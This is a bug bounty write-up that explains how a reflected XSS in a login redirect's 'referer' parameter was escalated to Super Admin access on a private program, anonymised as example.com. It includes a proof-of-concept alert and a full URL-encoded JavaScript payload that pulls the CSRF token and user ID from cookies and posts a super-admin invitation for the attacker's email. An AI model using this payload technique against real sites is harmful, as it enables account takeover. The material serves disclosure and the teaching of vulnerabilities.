---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-25_how-i-leveraged-xss-to-make-privilege-escalation-to-be-super-admin.md
original_filename: 2021-03-25_how-i-leveraged-xss-to-make-privilege-escalation-to-be-super-admin.md
title: How I leveraged XSS to make Privilege Escalation to be Super Admin!
category: documents
detected_topics:
- access-control
- xss
- ssrf
- command-injection
- csrf
- api-security
tags:
- imported
- documents
- access-control
- xss
- ssrf
- command-injection
- csrf
- api-security
language: en
raw_sha256: 4fc653d169352be20ccb9389e7b0b72a10081e70a59e79abf2be21921ef095de
text_sha256: 30fe372aba1dbac8fe8f2feab0b85cf4426b292e865bf86f0ae00ac14f3c300f
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# How I leveraged XSS to make Privilege Escalation to be Super Admin!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-25_how-i-leveraged-xss-to-make-privilege-escalation-to-be-super-admin.md
- Source Type: markdown
- Detected Topics: access-control, xss, ssrf, command-injection, csrf, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `4fc653d169352be20ccb9389e7b0b72a10081e70a59e79abf2be21921ef095de`
- Text SHA256: `30fe372aba1dbac8fe8f2feab0b85cf4426b292e865bf86f0ae00ac14f3c300f`


## Content

---
title: "How I leveraged XSS to make Privilege Escalation to be Super Admin!"
url: "https://melotover.medium.com/how-i-leveraged-xss-to-make-privilege-escalation-to-be-super-admin-e120b6090451"
authors: ["Asem Eleraky (@melotover)"]
bugs: ["XSS", "Privilege escalation"]
publication_date: "2021-03-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3792
scraped_via: "browseros"
---

# How I leveraged XSS to make Privilege Escalation to be Super Admin!

How I leveraged XSS to make Privilege Escalation to be Super Admin!
Asem Eleraky
Follow
4 min read
·
Mar 24, 2021

483

3

Hi, I’m Asem Eleraky -aka Melotover- and today I will show you how I could leverage an XSS vulnerability using XHR request to make the attacker be a Super Admin on the victim account!

First of all, This was a private program, so I will refer to it with example.com.
Let me tell you how I found the Reflected XSS vulnerability first.

Finding The XSS:

When I do my recon I usually check the out of scope domains and see if it has any relation to the in-scope stuff, so when I start to navigate a subdomain called community.example.com, I found a login button that will redirect the user to login in the main domain first which is in-scope, and then redirect him back to this subdomain, checked the link in my browser!

Press enter or click to view image in full size
Checking if there is a parameter or something related to the main scope!

I found this URL
https://app.example.com/path/to/authenticate?referer=https%3A%2F%2Fcommunity.example.com%2F

So now we have a parameter called referer that have a value of a URL,
So as usual I tried to do two things:

Tried to exploit SSRF, but it was redirecting me to my localhost, tried with some SSRF payloads, and no result!
Tried to find Open Redirect, and if it worked fine, I usually check if I can leverage it to Reflected XSS, and this way worked with me!

The referer parameter has no validation on it so when I add javascript schema and some javascript code after it, It works fine!

https://app.example.com/path/to/authenticate?referer=javascript:alert(1);//

Press enter or click to view image in full size

Good, Now we have P3 severity vulnerability, but when I found XSS affects the main domain of any application, I usually search for further exploitation so I can raise the severity, get more points, money, knowledge, and searching to learn something new!

Check Possible Functions:

Now I can run javascript in a really sensitive and trusted subdomain in the whole application, so tried to check all functions in the application to see if I can make more noise!

Get Asem Eleraky’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

And here is what I found:

Change the user email function without asking the user for the current password which is great right?!
Yes, but it needs the user to visit the confirmation link that will be sent to the email! ,,, I think it could be exploitable but the PoC will be more complex so let it be our last choice!
A function that can send an invitation to any user to add him to the same account as a restricted privileged user and an option for a Super admin privileged user! ,,, Nooooice one! let’s do it!
Checking the Request:

By checking the request for adding a Super admin privileged user, I found that I should be aware of three important things that should be in the request:

Press enter or click to view image in full size

The request should have:

The GET parameter PID of the current user!
There is a X-Example-CSRF header with a CSRF value!
The request body is a JSON format that contains the email we want to send the invitation to with the right role.

So our exploit should be like make a form that sends the post request to add our email and this request contains the Pid number of the victim user that we don’t have and the CSRF value and again we don’t have it!
And the main problem here that the request is a JSON format and the HTML form can not do it for us! even adding headers!

Here comes the XMLHttpRequest or XHR request which will help us to send a request with a JSON body and add headers which is Great!
But we still have missing information, so we need to dig more!

I looked deeply at the request again and found that the cookie parameters have very useful information like our Pid number in the USER_ID parameter and the CSRF value in example-csrf cookie parameter!

Press enter or click to view image in full size

Now, I have all what I need right here, let’s write a simple javascript code that makes the whole process!

Javascript Payload:

Note: if you could not see my javascript payload, you can check it out from Here

Now the exploit will be just to send this link to the victim!

https://app.example.com/path/to/authenticate?referer=javascRipt%3avar+email%3d+"attacher%40email.com"%3bvar+csrf%3d+document.cookie.split('%3b+').find(row+%3d>+row.startsWith('example-csrf')).split('%3d')[1]%3bvar+pid%3d+document.cookie.split('%3b+').find(row+%3d>+row.startsWith('USER_ID')).split('%3d')[1]%3bvar+http%3dnew+XMLHttpRequest()%3bhttp.open('POST','https%3a//api.example.com/app/v1/users/add/%3fPid%3d'%2bpid%2b'%26clienttimeout=14000%26app=users%26version=1.0',+true)%3bhttp.withCredentials%3dtrue%3bhttp.setRequestHeader('X-example-CSRF',csrf)%3bhttp.setRequestHeader('Content-type','application/json')%3bhttp.send('{"users"%3a[{"email"%3a"'%2bemail%2b'","emailSent"%3atrue,"firstName"%3a"","lastName"%3a"","roleNames"%3a[],"jita"%3afalse,"expiresAt"%3anull,"primaryTeamId"%3a-1,"secondaryTeamIds"%3a[],"partner"%3afalse,"pending"%3afalse,"existingInexample"%3afalse,"hasTwoFactorBackupCodes"%3afalse,"hasTwoFactorConfigured"%3afalse,"userAssetsCount"%3anull,"scim"%3afalse}],"roleNames"%3a["super-admin"],"teamId"%3anull,"secondaryTeamIds"%3a[],"sendWelcomeEmail"%3atrue,"forceWelcomeEmail"%3atrue}')%3b

when the user visits the link the javascript code will be executed and send an invitation to our email and we become a Super admin privileged user on the victim account!

And that’s it!

Report Timeline:
09 Feb: Submitted.
11 Feb: Triaged as P2 Severity.
12 Feb: Bounty Rewarded.

Thanks for reading my first write-up in my bug bounty hunting journey!
I hope you enjoyed reading!

I will be very happy if you have any feedback!
